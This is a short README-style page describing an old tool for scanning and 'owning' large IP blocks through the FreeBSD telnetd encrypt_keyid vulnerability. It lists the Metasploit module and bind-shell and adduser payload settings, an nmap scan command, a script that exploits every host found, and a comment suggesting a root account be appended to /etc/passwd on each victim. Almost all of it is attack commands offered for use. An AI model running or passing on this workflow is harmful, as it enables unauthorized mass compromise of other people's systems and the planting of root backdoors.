Free-BSD
========

Remember when FreeBSD was hit w/the telnet vuln, and people went crazy to own it .. well this was (now oudated) tool that allowed for scanning and owning of large IP blocks. 


//----------------------------
// Telnetd stitching
// - "scan, collect, exploit"
// by: sk
// updated: 12/29/11
//
// Todo: Make 100% autonomous
// Todo: Add support for linux
// Thoughts: Perhaps we just run a single command on each host
//	this way we require no user interaction. For example:
// 	echo "blah:hashhashhashhash:0:0:Blah:/var/root:/bin/sh" >> /etc/passwd
// 
// Shoutz: Bindshell crew, ohdae, vorbs, et all.
//-----------------------------

t
--- Setup / PreReqs
-------------------

* Update metasploit via svn up
- cd /opt/metasploit3/msf3; svn up

       FreeBSD, works:
       use exploit/freebsd/telnet/telnet_encrypt_keyid 
       set payload bsd/x86/shell/bind_tcp

       Linux, (haven't tested...):
       use exploit/linux/telnet/telnet_encrypt_keyid 
       set payload/linux/x86/adduser


* Update nmap (download and build from source)
- svn co https://svn.nmap.org/nmap
- cd nmap; configure; make


--- Vuln search, exploiting
---------------------------

* Run nmap against your host(s):
./nmap -p23 -PS23 --script telnet-encryption -T5 -oA telnet_logs <IP...>

* Parse output: 
php parseGnmap.php -f telnet_logs.gnmap -o outfile.txt

* Now run the file and sploit each host:
- chmod +x outfile.txt
- ./outfile.txt
  (example: msfcli exploit/freebsd/telnet/telnet_encrypt_keyid RHOST=<IP> PAYLOAD=bsd/x86/shell/bind_tcp E)
 
